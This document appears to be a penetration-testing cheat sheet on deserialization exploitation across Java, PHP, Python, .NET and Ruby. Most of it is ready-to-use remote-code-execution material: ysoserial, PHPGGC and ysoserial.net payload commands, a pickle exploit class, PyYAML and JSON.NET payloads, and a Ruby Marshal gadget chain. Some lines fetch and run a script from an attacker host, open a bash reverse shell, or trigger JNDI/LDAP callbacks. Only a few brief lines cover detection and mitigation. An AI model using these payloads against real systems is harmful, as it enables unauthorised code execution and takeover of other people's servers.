# Deserialization Exploitation

## Java Deserialization

### Detection
```
# Look for:
# - Java serialized objects: AC ED 00 05 (hex) / rO0AB (base64)
# - Content-Type: application/x-java-serialized-object
# - Binary data in cookies, parameters, or POST bodies
# - Libraries: Apache Commons Collections, Spring, etc.
```

### ysoserial (Main Tool)
```bash
# Generate payloads
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
java -jar ysoserial.jar CommonsCollections5 'curl http://ATTACKER/shell.sh | bash' > payload.bin

# Common gadget chains:
# CommonsCollections1-7  — Apache Commons Collections 3.x/4.x
# CommonsBeanutils1      — Commons BeanUtils
# Spring1/Spring2        — Spring Framework
# Hibernate1             — Hibernate ORM
# Jdk7u21                — JDK ≤ 7u21
# URLDNS                 — DNS resolution (detection, no RCE)

# Base64 for web parameters
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0

# URLDNS for blind detection (triggers DNS lookup)
java -jar ysoserial.jar URLDNS 'http://ATTACKER_DOMAIN' | base64 -w0
```

### ysoserial-modified / marshalsec
```bash
# For specific protocols:
# JMX, RMI, JNDI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit"

# JNDI injection (Log4Shell-style)
# ${jndi:ldap://ATTACKER/exploit}
# ${jndi:rmi://ATTACKER/exploit}
```

### Detection & Remediation
```
# Detect vulnerable libraries:
# Find commons-collections, spring-beans, etc. in classpath
# Check with: java -jar ysoserial.jar URLDNS (blind check)

# Mitigation: ObjectInputFilter (Java 9+), look-ahead deserialization
```

---

## PHP Deserialization

### Detection
```
# Look for:
# - serialize()/unserialize() calls
# - O:4:"User":2:{...} format in parameters/cookies
# - __wakeup(), __destruct(), __toString() magic methods
```

### PHPGGC (PHP Generic Gadget Chains)
```bash
# List available chains
phpggc -l

# Generate payload
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE1 system id
phpggc Guzzle/RCE1 system id
phpggc Monolog/RCE1 system id
phpggc WordPress/RCE1 system id

# Common chains:
# Laravel/RCE1-9    — Laravel framework
# Symfony/RCE1-4    — Symfony framework
# Guzzle/RCE1       — Guzzle HTTP
# Monolog/RCE1-3    — Monolog logging
# WordPress/RCE1-2  — WordPress
# Doctrine/RCE1-2   — Doctrine ORM
# Slim/RCE1         — Slim framework
# ThinkPHP/RCE1-2   — ThinkPHP

# URL-safe encoding
phpggc -u Laravel/RCE1 system id

# Base64
phpggc -b Laravel/RCE1 system id

# With phar:// wrapper (file operation trigger)
phpggc -p phar -o exploit.phar Laravel/RCE1 system id
# Trigger: file_exists('phar://uploads/exploit.jpg')
```

### Phar Deserialization
```php
// Any file operation function triggers phar deserialization:
// file_exists(), is_dir(), fopen(), file_get_contents(), file(), etc.
// Upload a phar file (rename to .jpg if needed)
// Trigger via: phar://uploads/exploit.jpg/test
```

---

## Python Deserialization

### pickle
```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# Send payload to endpoint that calls pickle.loads()

# Base64 variant
import base64
print(base64.b64encode(payload).decode())
```

### PyYAML
```yaml
# Unsafe load (yaml.load without Loader)
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]
!!python/object/new:subprocess.check_output [['id']]

# Reverse shell
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'"]
```

### jsonpickle
```python
# If jsonpickle.decode() is used on user input:
{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}
```

---

## .NET Deserialization

### Detection
```
# Look for:
# - BinaryFormatter, SoapFormatter, ObjectStateFormatter
# - ViewState (ASP.NET) — FFFFFFFFFF format
# - Content-Type: application/soap+xml
# - TypeNameHandling in JSON.NET config
```

### ysoserial.net
```bash
# Generate payloads
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc"
ysoserial.exe -g PSObject -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c whoami"

# For ViewState attacks
ysoserial.exe -p ViewState -g TextFormattingRunProperties --validationkey=KEY --validationalg=SHA1 -c "cmd /c whoami"

# JSON.NET with TypeNameHandling
# If TypeNameHandling != None:
{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
 "MethodName": "Start",
 "MethodParameters": {"$type": "System.Collections.ArrayList", "$values": ["cmd", "/c whoami"]},
 "ObjectInstance": {"$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}
```

---

## Ruby Deserialization

### Marshal
```ruby
# Ruby Marshal.load on user input
# Universal gadget chain (Ruby 2.x-3.x)
require 'erb'

class Exploit
  def initialize
    @src = "system('id')"
    @filename = "x"
    @lineno = 0
  end
end

payload = Marshal.dump(ERB.new("<%= system('id') %>"))
```

---

## Identification Checklist

| Language | Serialized Format | Magic Bytes / Signature |
|----------|------------------|------------------------|
| Java | Binary | `AC ED 00 05` / `rO0AB` (base64) |
| PHP | Text | `O:4:"User":2:{s:4:"name";...}` |
| Python | Binary (pickle) | `\x80\x04\x95` (protocol 4) |
| .NET | Binary/SOAP | `AAEAAAD/////` (base64) |
| Ruby | Binary (Marshal) | `\x04\x08` |
| Node.js | JSON | `{"rce":"_$$ND_FUNC$$_..."}` (node-serialize) |
